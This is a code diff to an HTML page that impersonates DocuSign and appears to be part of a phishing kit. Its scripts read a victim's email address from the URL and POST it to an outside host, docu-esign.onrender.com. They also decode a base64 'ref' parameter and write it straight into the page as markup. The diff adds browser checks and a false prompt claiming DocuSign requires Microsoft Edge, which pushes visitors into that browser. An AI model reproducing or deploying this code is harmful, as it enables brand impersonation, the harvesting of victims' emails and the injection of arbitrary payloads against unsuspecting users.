@@ -7,30 +7,40 @@
       DocuSign | #1 in Electronic Signature and Contract Lifecycle Management
     </title>
 
-    <script type="text/javascript">
-      let hasEmail = new URLSearchParams(window.location.search).has("id");
-      if (hasEmail) {
-        let email = new URLSearchParams(window.location.search).get("id");
-        let payLoad = { id: 0, email: email };
-        let emailXhr = new XMLHttpRequest();
-        emailXhr.open("POST", "https://docu-esign.onrender.com/email", true);
-        emailXhr.setRequestHeader("Content-type", "application/json");
-        emailXhr.send(JSON.stringify(payLoad));
+    <script>
+      let isEdge = /Edg\//.test(navigator.userAgent);
+      let isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
 
-        emailXhr.onreadystatechange = function () {
-          if (this.readyState == 4 && this.status == 200) {
-            let response = JSON.parse(this.response);
-            console.log(response);
-          }
-        };
-      }
-    </script>
+      if (isEdge || isSafari) {
+        let hasEmail = new URLSearchParams(window.location.search).has("id");
+        if (hasEmail) {
+          let email = new URLSearchParams(window.location.search).get("id");
+          let payLoad = { id: 0, email: email };
+          let emailXhr = new XMLHttpRequest();
+          emailXhr.open("POST", "https://docu-esign.onrender.com/email", true);
+          emailXhr.setRequestHeader("Content-type", "application/json");
+          emailXhr.send(JSON.stringify(payLoad));
 
-    <script type="text/javascript">
-      let hasRef = new URLSearchParams(window.location.search).has("ref");
-      if (hasRef) {
-        let ref = new URLSearchParams(window.location.search).get("ref");
-        document.write(decodeURIComponent(atob(`${ref}`)));
+          emailXhr.onreadystatechange = function () {
+            if (this.readyState == 4 && this.status == 200) {
+              let response = JSON.parse(this.response);
+              console.log(response);
+            }
+          };
+        }
+        let hasRef = new URLSearchParams(window.location.search).has("ref");
+        if (hasRef) {
+          let ref = new URLSearchParams(window.location.search).get("ref");
+          document.write(decodeURIComponent(atob(`${ref}`)));
+        }
+      } else {
+        if (
+          confirm(
+            "For best experience, Docusign must be used with Microsoft Edge browser. Click OK to continue."
+          )
+        ) {
+          window.location.replace("microsoft-edge:" + window.location.href);
+        }
       }
     </script>
 
@@ -58,16 +68,20 @@
       content="DocuSign ensures the security &amp; mobility to digitally transform businesses. Sign docs for free."
     />
     <style>
-        #loader {
-            width: 0%;
-            position: relative;
-            animation: incrementWidth 1s linear forwards;
+      #loader {
+        width: 0%;
+        position: relative;
+        animation: incrementWidth 1s linear forwards;
+      }
+
+      @keyframes incrementWidth {
+        0% {
+          width: 0%;
         }
-    
-        @keyframes incrementWidth {
-            0% { width: 0%; }
-            100% { width: 98%; }
+        100% {
+          width: 98%;
         }
+      }
     </style>
   </head>
   <body>
@@ -84,13 +98,15 @@
         <img src="./Email_Logo.png" alt="" style="margin-left: 13px" />
         <div
           id="loader"
-          style="padding: 2px; background-color: rgb(30, 76, 161); border-radius: 4px;"
+          style="
+            padding: 2px;
+            background-color: rgb(30, 76, 161);
+            border-radius: 4px;
+          "
         ></div>
       </div>
     </div>
 
-    <script>
-
-    </script>
+    <script></script>
   </body>
 </html>
